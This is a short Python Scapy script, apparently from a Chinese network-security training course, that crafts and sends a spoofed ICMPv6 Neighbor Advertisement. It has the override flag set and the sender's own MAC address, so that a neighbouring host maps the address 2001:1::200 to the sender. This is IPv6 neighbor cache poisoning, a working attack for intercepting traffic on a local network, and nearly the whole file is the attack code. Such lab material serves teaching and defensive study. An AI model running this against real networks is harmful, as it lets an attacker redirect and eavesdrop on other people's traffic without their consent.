#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

# IPv6参考文档
# https://www.idsv6.de/Downloads/IPv6PacketCreationWithScapy.pdf
# https://www.ernw.de/download/Advanced%20Attack%20Techniques%20against%20IPv6%20Networks-final.pdf


import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
from scapy.all import *
from Part1_Classic_Protocols.Tools.GET_MAC import get_mac_address

ll_mac = get_mac_address('ens33')
ether = Ether(dst='00:50:56:ab:4d:19')
base=IPv6(src='2001:1::200', dst='FE80::250:56FF:FEAB:4D19')
neighbor_advertisements=ICMPv6ND_NA(tgt="2001:1::200",R=0,S=0,O=1)
src_ll_addr=ICMPv6NDOptDstLLAddr(lladdr=ll_mac)
packet=ether/base/neighbor_advertisements/src_ll_addr
packet.show()
sendp(packet)


if __name__ == '__main__':
    pass
